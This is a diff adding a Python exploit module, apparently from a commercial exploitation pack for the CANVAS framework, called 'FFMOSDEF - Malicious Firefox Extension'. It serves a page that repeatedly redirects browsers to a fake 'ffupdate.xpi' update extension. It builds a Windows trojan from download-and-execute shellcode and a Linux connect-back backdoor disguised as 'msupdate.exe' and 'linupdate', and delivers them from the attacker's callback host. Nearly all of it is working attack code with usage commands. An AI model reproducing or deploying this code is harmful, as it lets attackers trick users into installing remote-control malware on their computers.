@@ -1,0 +1,256 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from httpclientside import httpclientside
+from canvasexploit import canvasexploit
+from libs.canvasos import *
+from MOSDEF import pelib 
+
+import canvasengine
+import struct
+import os
+import zipfile
+
+# GUI info
+NAME = "FFMOSDEF - Malicious Firefox Extension"
+
+DESCRIPTION = "Malicious Firefox extension downloading and executing a MOSDEF trojan"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "Not public"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [ ['Windows'], ['Linux'] ]
+
+NOTES="""
+Tested on Windows with Firefox 1.5 to 3.0.1
+Tested on Linux with Firefox 1.5 to 2.x
+
+Usage:
+.\commandlineInterface.py -p 443 -v 9
+.\exploits\httpserver\httpserver.py -v 1 -O HTTPMOSDEF:1 -O singleexploit:d2sec_ffmosdef -l 192.168.11.1 -d 443 -p 80
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0:['All'],
+}
+
+	
+class theexploit(tcpexploit,httpclientside):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        httpclientside.__init__(self)
+        self.clientversion = 1
+        self.name = NAME 
+        self.filename = "index.html"
+        self.xpiname = "ffupdate.xpi"
+        self.trojannamewin = "msupdate.exe"
+        self.trojannamelinux = "linupdate"
+        return
+
+    def makefile(self):
+        filedata = """
+<HTML>
+
+  <SCRIPT>
+	var isDetected = 0;
+  	
+  	function refresh() 
+  	{  	
+  		if (isDetected == 0) {	
+    			window.location.href = "XPIURL";
+    		}
+    	}
+  </SCRIPT>
+  
+  <IMG src="chrome://ffupdate/skin/ffupdate.png" onload="isDetected = 1;" style="visibility:hidden">
+  
+	<SCRIPT>
+		for(i=0;i<10;i++) {
+			setTimeout("refresh()", 2000 + (i*i*3000));			
+		}		
+	</SCRIPT>
+
+</HTML>         
+"""
+
+        filedata = filedata.replace("XPIURL", "http://" + self.callback.ip + "/" + self.xpiname)
+
+        if self.useSSL:
+        	filedata = filedata.replace("http:", "https:")
+        
+        return filedata
+
+    def makexpi(self):
+    		path = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_ffmosdef/"
+    		
+    		f = open(path + "ffupdate/chrome/content/ffupdate.js", "rb")
+    		jsfile = f.read()
+    		f.close()
+    		
+    		jsfile = jsfile.replace("<TARGETURLWIN>",   "http://" + self.callback.ip + "/" + self.trojannamewin)
+    		jsfile = jsfile.replace("<TARGETURLLINUX>", "http://" + self.callback.ip + "/" + self.trojannamelinux)
+    		
+    		if self.useSSL:
+    			jsfile = jsfile.replace("http:", "https:")
+    
+    		f = open(path + "ffupdate/chrome/content/ffupdate.js.tmp", "w")    		
+    		f.write(jsfile)
+    		f.close()    		    		
+    		
+    		file = zipfile.ZipFile(path + self.xpiname, "w")
+    		file.write(path + "ffupdate/install.rdf", "install.rdf", zipfile.ZIP_DEFLATED)
+    		file.write(path + "ffupdate/chrome.manifest", "chrome.manifest", zipfile.ZIP_DEFLATED)
+    		file.write(path + "ffupdate/chrome/content/ffupdate.js.tmp", "chrome/content/ffupdate.js", zipfile.ZIP_DEFLATED)
+    		file.write(path + "ffupdate/chrome/content/ffupdate.xul", "chrome/content/ffupdate.xul", zipfile.ZIP_DEFLATED)
+    		file.write(path + "ffupdate/chrome/skin/classic/ffupdate/ffupdate.png", "chrome/skin/classic/ffupdate/ffupdate.png", zipfile.ZIP_DEFLATED)
+    		file.write(path + "ffupdate/platform/Linux_x86-gcc3/components/D2Component.so", "platform/Linux_x86-gcc3/components/D2Component.so", zipfile.ZIP_DEFLATED)
+    		file.write(path + "ffupdate/platform/Linux_x86-gcc3/components/ID2Component.xpt", "platform/Linux_x86-gcc3/components/ID2Component.xpt", zipfile.ZIP_DEFLATED)    		
+    		file.write(path + "ffupdate/platform/WINNT_x86-msvc/components/D2Component.dll", "platform/WINNT_x86-msvc/components/D2Component.dll", zipfile.ZIP_DEFLATED)
+    		file.write(path + "ffupdate/platform/WINNT_x86-msvc/components/ID2Component.xpt", "platform/WINNT_x86-msvc/components/ID2Component.xpt", zipfile.ZIP_DEFLATED)    		
+    		file.close()
+    		
+    		os.remove(path + "ffupdate/chrome/content/ffupdate.js.tmp")
+    		
+    		return
+    	
+ 
+    def maketrojan_win(self):
+        host = self.callback.ip
+        port = self.callback.port
+
+        sc = shellcodeGenerator.win32()
+        sc.addAttr("findeipnoesp", {"subespval":0x1000})                
+                        	
+        if self.useSSL:
+            ssl = "s"
+        else:
+            ssl = ""                
+                    
+        sc.addAttr("httpGetShellcode", {"URL":"http%s://%s:%d/w" % (ssl, host, port)})
+        shellcode = sc.get()        
+        myPElib = pelib.PElib()
+	
+        self.mosdeftrojan = myPElib.createPEFileBuf(shellcode)
+        
+        self.log("Writing out %d bytes to %s" % (len(self.mosdeftrojan), self.trojannamewin))
+
+        file(self.trojannamewin, "wb").write(self.mosdeftrojan)
+        self.setInfo("%s - done" % (NAME))
+        ret = len(self.mosdeftrojan) != 0
+        
+        return ret
+
+    def maketrojan_linux(self):
+        from MOSDEF import makeexe
+        from MOSDEF.cc import threadsafe_cc_main
+
+        self.log("[!] Compiling Unix trojan")
+        infilename = "backdoors/cback_mmap_rwx.c"
+        vars = {}
+        vars['CBACK_PORT'] = self.callback.port
+        vars['CBACK_ADDR'] = str2int32(socket.inet_aton(self.callback.ip))
+        self.log("[!] Callback address is %s"%vars['CBACK_ADDR'])
+        cc_command = []
+        for var in vars:
+            cc_command += ["-D","%s=%s"%(var,vars[var])]
+        cc_command += ["-d", "-v","-m","Linux" ,"-p", "i386","-k", "None", infilename]
+        self.log("[!] CC command: %s"%cc_command)
+        self.mosdeftrojan = threadsafe_cc_main(cc_command)
+        self.log("[!] Length of CC compiled trojan: %s"% len(self.mosdeftrojan))
+        self.log("[!] Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojannamelinux))
+        file(self.trojannamelinux, "wb").write(self.mosdeftrojan)
+        self.setInfo("%s - done" % (NAME))
+        ret = len(self.mosdeftrojan) != 0
+
+        return ret
+
+    def makesploit(self, clientheader, clientbody):        
+        from libs.spkproxy import header, body
+        h = header('SERVER')
+        b = body()
+        
+        self.maketrojan_win()
+        self.maketrojan_linux()
+        
+        if clientheader.URL.count(self.filename):                        
+            sploitstring = self.makefile()            
+            b.setBody(sploitstring)
+            
+        elif clientheader.URL.count(self.trojannamewin):
+            self.log("Sending MOSDEF trojan")
+            f = open(self.trojannamewin, "rb")
+            sploitstring = f.read()
+            f.close()
+            os.remove(self.trojannamewin)
+            self.log("Sending %d bytes" % len(sploitstring))
+            h.addHeader("Content-type", "binary/octet-stream")
+            h.addHeader("Connection", "close")
+            b.setBody(sploitstring)
+            
+        elif clientheader.URL.count(self.trojannamelinux):
+            self.log("Sending MOSDEF trojan")
+            f = open(self.trojannamelinux, "rb")
+            sploitstring = f.read()
+            f.close()
+            os.remove(self.trojannamelinux)
+            self.log("Sending %d bytes" % len(sploitstring))
+            h.addHeader("Content-type", "binary/octet-stream")
+            h.addHeader("Connection", "close")
+            b.setBody(sploitstring)
+
+        elif clientheader.URL.count(self.xpiname):
+            self.log("Creating XPI file")        	
+            self.makexpi()                        
+            self.log("Sending XPI file")
+            f = open(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_ffmosdef/" + self.xpiname, "rb")
+            sploitstring = f.read()
+            f.close()     
+            os.remove(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_ffmosdef/" + self.xpiname)
+            self.log("Sending %d bytes" % len(sploitstring))
+            h.addHeader("Content-type", "application/x-xpinstall")
+            h.addHeader("Connection", "close")
+            b.setBody(sploitstring)               
+            
+        else:
+            self.log("Redirecting to self")
+            h.status = "302"
+            h.addHeader('Location', self.filename)
+            h.addHeader('Content-Type', 'binary/octet-stream')
+        return h, b
+
+    def neededListenerTypes(self):
+        from canvasengine import HTTPMOSDEF
+        return [HTTPMOSDEF]
+            
+    def run(self):        
+        return 1
+
+if __name__=='__main__':
+    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
